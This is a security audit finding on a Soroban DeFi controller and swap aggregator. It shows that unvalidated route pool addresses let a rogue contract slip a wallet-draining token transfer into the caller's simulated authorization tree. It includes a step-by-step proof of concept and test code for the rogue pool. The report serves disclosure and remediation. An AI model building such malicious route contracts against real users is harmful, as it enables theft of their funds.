### Title
Route-controlled contracts can execute attacker code beneath a caller’s swap authorization and drain unrelated wallet assets - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
The controller accepts an arbitrary encoded swap route and forwards it to the configured router while the caller’s `swap_collateral` authorization is active. [1](#0-0)  The route’s pool address is payload-controlled, and the router invokes that address through the selected venue adapter. [2](#0-1)  Because Soroban records a nested `require_auth` beneath the caller’s root authorization, a malicious route contract can add an unrelated wallet-token transfer to the transaction’s simulated authorization tree and execute it when the returned tree is signed.

### Finding Description
`swap_collateral` authorizes the caller, validates account ownership or delegation, and passes the attacker-supplied `swap` bytes into `withdraw_and_swap_from_supply`. [3](#0-2)  `swap_tokens` then calls `router.execute_strategy(&controller, &amount_in, swap)` without interpreting or restricting the route’s venue addresses. [4](#0-3) 

The router decodes a payload whose asset registry contains both token and pool addresses; a `Swap` instruction resolves `idx_a` as the pool and dispatches it to the selected venue adapter. [2](#0-1)  For example, the Phoenix adapter directly invokes `pool.swap(...)`, while the Soroswap adapter invokes `pool.get_reserves()` and `pool.swap(...)`. [5](#0-4) [6](#0-5) 

Neither the controller nor the router validates that the pool address belongs to a known venue deployment. [2](#0-1)  An attacker can therefore provide a contract whose `swap` implementation calls an unrelated token’s `transfer(victim, attacker, amount)`. [7](#0-6)  During transaction simulation, that child transfer is recorded beneath the victim’s `swap_collateral` authorization; if the generated tree is signed, the transfer succeeds atomically with an otherwise valid swap. [8](#0-7) 

### Impact Explanation
A malicious route can steal any Stellar asset held by the caller that is reachable through token-interface authorization, not only the collateral amount supplied to the swap. [9](#0-8)  The demonstrated path leaves the victim with a valid protocol position and fair swap output, so neither the controller’s positive-output check nor its final risk check bounds the wallet loss. [10](#0-9) 

This is theft of user funds and is reachable through the permissionless `swap_collateral` route argument. [11](#0-10) 

### Likelihood Explanation
Exploitation requires the victim to submit a malicious route and sign the authorization tree produced by simulation; an attacker cannot authorize the unrelated transfer unilaterally. [12](#0-11)  The route format is opaque packed XDR and the malicious behavior is not apparent from the declared input, output, or minimum-output fields, so a wallet or integration that trusts a route source and signs the returned authorization tree exposes its full token balances. [13](#0-12) 

The tested sequence confirms both halves of the attack: an honest authorization tree rejects the rogue transfer, while the simulated tree containing that transfer authorizes it. [14](#0-13) 

### Recommendation
Do not place arbitrary payload-selected contracts beneath a broad account authorization tree. Constrain route pool addresses to governance-attested venue deployments, or execute route hops under an isolated contract/initiator that cannot inherit the swap caller’s account authorization. At minimum, the controller and router API should return or expose the exact expected child-authorization shape, and integrations must reject any tree containing children other than the expected input transfer.

### Proof of Concept
1. Deploy a contract implementing the venue-expected `swap` function.
2. Configure that function to invoke `unrelated_token.transfer(victim, attacker, victim_balance)` and then return normally.
3. Construct a valid `StrategySwap` whose `assets` registry contains the malicious contract as the pool, a listed input token as `token_in`, and a listed output token as `token_out`; choose venue and amount fields so `execute_strategy` dispatches the hop.
4. Have the victim invoke `swap_collateral(caller=victim, account_id=victim_account, current=input_market, amount=input_amount, new=output_market, swap=malicious_route)`. [11](#0-10) 
5. Simulate the transaction; the unrelated token transfer appears as a child under the victim’s `swap_collateral` authorization. [15](#0-14) 
6. Submit the transaction using that simulated authorization tree; the pool returns a valid output while the child call transfers `victim_balance` of the unrelated token to the attacker. [16](#0-15)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L24-38)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L51-63)
```rust
pub(crate) fn run(env: Env, sender: Address, total_in: i128, payload: StrategyPayload) -> i128 {
    sender.require_auth();

    if total_in <= 0 {
        panic_with_error!(&env, Error::InvalidAmount);
    }

    let StrategyPayload {
        amounts,
        assets,
        ops,
    } = payload;
    let program = Program::decode(&env, &ops, assets.len(), amounts.len());
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L151-165)
```rust
    match op.opcode {
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/swap-aggregator/src/venues/phoenix.rs (L22-25)
```rust
    ctx.authorize_pool_pull();
    let _: i128 = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
```

**File:** contracts/swap-aggregator/src/venues/soroswap.rs (L54-87)
```rust
    let no_args: Vec<Val> = vec![ctx.env];
    let (reserve_0, reserve_1): (i128, i128) = ctx.env.invoke_contract(
        &ctx.hop.pool,
        &Symbol::new(ctx.env, "get_reserves"),
        no_args,
    );
    let (reserve_in, reserve_out) = if token_in_is_0 {
        (reserve_0, reserve_1)
    } else {
        (reserve_1, reserve_0)
    };

    let requested_out = soroswap_amount_out(ctx.env, ctx.amount_in, reserve_in, reserve_out);
    if requested_out <= 0 {
        panic_with_error!(ctx.env, Error::ZeroOutput);
    }

    let token_client = token::Client::new(ctx.env, &ctx.hop.token_in);
    token_client.transfer(ctx.router, &ctx.hop.pool, &ctx.amount_in);

    let (amount_0_out, amount_1_out) = if token_in_is_0 {
        (0_i128, requested_out)
    } else {
        (requested_out, 0_i128)
    };
    let args: Vec<Val> = vec![
        ctx.env,
        amount_0_out.into_val(ctx.env),
        amount_1_out.into_val(ctx.env),
        ctx.router.into_val(ctx.env),
    ];
    let _: () = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L20-22)
```rust
const SWAP_IN_USDC: i128 = 50_000_000_000; // 5 000 USDC, 7 decimals
const FAIR_OUT_ETH: i128 = 25_000_000; // 2.5 ETH at $2 000
const WALLET_BALANCE: i128 = 77_770_000_000; // Alice's balance of a token the protocol never listed
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-226)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-268)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** interfaces/controller/src/lib.rs (L98-106)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    );
```

**File:** contracts/swap-aggregator/src/program.rs (L8-25)
```rust
//! ```text
//! header (10 bytes)
//!   [0]      version, must be VERSION
//!   [1]      token_in   -> assets[..]
//!   [2]      token_out  -> assets[..]
//!   [3]      min_out    -> amounts[..]
//!   [4..8]   referral id, u32 big-endian (0 = none)
//!   [8]      op_count
//!   [9]      weight_count
//! instructions (5 * op_count bytes)
//!   [0]      opcode      -> Opcode
//!   [1]      mode        -> Mode
//!   [2]      idx_a       pool
//!   [3]      idx_b       token_in  | lp share token
//!   [4]      idx_c       token_out | amounts index
//! weights (3 * weight_count bytes)
//!   u24 big-endian parts-per-million, each in 1..=PPM_DENOMINATOR
//! ```
```
